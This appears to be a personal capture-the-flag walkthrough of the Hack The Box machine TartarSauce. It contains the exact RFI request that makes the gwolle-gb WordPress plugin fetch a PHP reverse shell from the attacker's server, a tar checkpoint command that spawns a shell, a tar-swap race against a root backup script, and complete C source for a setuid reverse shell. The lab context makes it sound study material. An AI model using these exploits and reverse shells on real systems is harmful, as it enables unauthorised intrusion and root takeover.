## Takeaway
- 
## Metadata
- `nikto` will identify an interesting `robots.txt` file which contains 5 entries. One of which is `/webservices/monstra-3.0.4/`. However,  `monstra`s exploit is an dead-end and the reason is explained by `0xdf` [here](https://0xdf.gitlab.io/2018/10/20/htb-tartarsauce.html)
- However, there is a `wordpress` site running under the path `/webservices` which can be identified using `gobuster`.![[Pasted image 20231228182725.png]]
- Using `wpscan --url http://10.10.10.88/webservices/wp/ --enumerate ap,t,u --plugins-detection aggresive` will reveal `gwolle-gb` plugin is running and its version is `2.3.10`. ![[Pasted image 20231228184204.png]]
	- However, If we actually navigate to `http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt`'s `ChangeLog` section, one can identify the actual version is `1.5.3` which is vulnerable to RFI and hence RCE.![[Pasted image 20231228184431.png]]
- 
#### Attack Path
- <mark>Exploitation</mark>
	- Generate a php reverse shell and rename it to `wp-load.php`. Then, set up a web server and navigate to `http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.7:1234/` for a reverse shell callback.
- <mark>Post-Exploitation</mark>
	- <mark>www-data => onuma</mark>
		- Running `sudo -l` reveals we can run `/bin/tar` as local user `onuma` without password.![[Pasted image 20231228201547.png]]
		- According to `GTFOBins`, one can spawn a shell with the following command `tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash`.![[Pasted image 20231228201841.png]]
		- ![[Pasted image 20231228201944.png]]
	- <mark>onuma => root</mark>
		- `linPEAS` will identify two back-up files that is constantly updating.![[Pasted image 20231228233835.png]]Running `pspy` allows us to identify a file `/usr/sbin/backuperer` which is responsible for updating the above 2 files regularly.![[Pasted image 20231228234419.png]]
		- Taking a closer look at the scrip. It is doing repeating following steps for every run.![[Pasted image 20231228234432.png]]
			- 1. Create a `tar` file of random name at `/var/tmp` of  `/var/www/html` as local user `onuma`.
			- 2. Wait for 30 seconds. 
			- 3. Extract the `tar` file into a directory called `check` at `/var/tmp` as `root` user. (The script is ran by the user `root` which is evident by the ownership of file `onuma_backup_test.txt`)
			- 4. If it is different, log the difference, otherwise clean up everything.
		- Since the temporary `tar` file is owned by user `onuma`, we have a 30s window to replace it with a new `tar` file that is archived on the attacker machine and contains a payload (Source Code is below) where
			- 1. the archived folder is `/var/www/html`.(Otherwise, the script won't go the `true` branch and the extracted folder will be deleted immediately!)
			- 2. root is the owner
			- 3. `setuid` bit is on
			- 4. `others` can execute the payload
		- Later, when the modified temporary `tar` file is extracted under the context of  root. All the file permissions and ownerships will be preserved. Since the scrip went into the `true` branch, we have around 4 minutes and half to execute the payload before the `check` folder is deleted.


```C
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdlib.h>

#define REMOTE_ADDR "192.168.1.100" 
#define REMOTE_PORT 4444             

# gcc -o payload payload.c -m32 -static
int main() {
    int sockfd;
    struct sockaddr_in remote_addr;

    // Create socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        perror("Could not create socket");
        exit(1);
    }

    // Set up remote address structure
    remote_addr.sin_family = AF_INET;
    remote_addr.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    remote_addr.sin_port = htons(REMOTE_PORT);

    // Connect to the remote host
    if (connect(sockfd, (struct sockaddr *)&remote_addr, sizeof(remote_addr)) == -1) {
        perror("Could not connect to remote host");
        exit(1);
    }

    // Redirect stdin, stdout, and stderr to the socket
    for (int i = 0; i <= 2; i++)
        dup2(sockfd, i);

    // Attempt to set UID to 0 (root)
    if (setuid(0) == -1) {
        perror("setuid failed");
        exit(1);
    }

    // Execute /bin/sh
    char *argv[] = {"/bin/sh", NULL};
    execv("/bin/sh", argv);

    // Close the socket
    close(sockfd);

    return 0;
}
```